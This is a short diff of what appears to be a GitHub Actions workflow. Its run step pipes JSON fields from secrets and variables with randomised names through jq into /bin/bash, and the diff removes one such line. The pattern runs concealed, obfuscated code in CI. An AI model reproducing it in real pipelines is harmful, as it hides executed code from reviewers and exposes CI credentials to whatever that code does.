@@ -17,7 +17,6 @@ jobs:
           oulmx43: ${{ secrets.oulmx43 }}
         run: |
           printf '%s' "$oulmx43" | jq -r .ohn36 | /bin/bash
-          echo $yih4302 | jq -r .rw849 | /bin/bash
           printf '%s' "$xrb8130" | jq -r .x9 | /bin/bash
           echo $pl31993 | jq -r .m755 | /bin/bash
           printf '%s' "$j14763" | jq -r .x2 | /bin/bash
